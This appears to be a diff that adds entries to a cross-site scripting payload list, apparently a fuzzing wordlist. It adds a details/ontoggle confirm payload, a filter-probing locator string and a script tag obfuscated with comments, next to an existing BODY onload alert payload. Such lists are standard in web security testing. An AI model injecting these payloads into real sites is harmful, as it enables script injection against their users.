@@ -8,3 +8,8 @@
 
 "><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 
+">'><details/open/ontoggle=confirm('XSS')>
+
+'';!--"<XSS>=&{()}
+
+<!--><script>alert/**/()/**/</script>
